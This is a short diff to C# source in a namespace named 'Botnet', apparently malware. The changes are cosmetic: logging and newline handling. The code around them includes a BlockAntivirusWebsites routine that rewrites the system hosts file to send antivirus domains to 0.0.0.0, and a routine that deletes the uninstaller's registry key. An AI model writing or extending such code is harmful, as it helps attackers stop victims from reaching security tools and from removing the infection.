@@ -270,6 +270,7 @@ namespace Botnet
             {
                 wresp?.Close();
             }
+            Console.WriteLine("Done");
         }
 
         public static void BlockAntivirusWebsites()
@@ -283,10 +284,10 @@ namespace Botnet
                 string line;
                 while ((line = reader.ReadLine()) != null)
                 {
-                    newHostsContent += "0.0.0.0\t" + line.Trim() + "\n";
+                    newHostsContent += "0.0.0.0\t" + line.Trim() + Environment.NewLine;
                 }
             }
-            Console.WriteLine("newHostsContent:\n" + newHostsContent);
+            Console.WriteLine("newHostsContent:" + Environment.NewLine + newHostsContent);
             try
             {
                 File.WriteAllText(systemHostsFile, newHostsContent.Trim());
@@ -674,9 +675,9 @@ namespace Botnet
                 }
                 DeleteRegistryKey(registryKeyInstaller);
             }
-            catch (Exception ex)
+            catch (Exception e)
             {
-                Console.WriteLine("Error deleting uninstaller: " + ex.Message);
+                Console.WriteLine("Error deleting uninstaller: " + e);
             }
         }
 
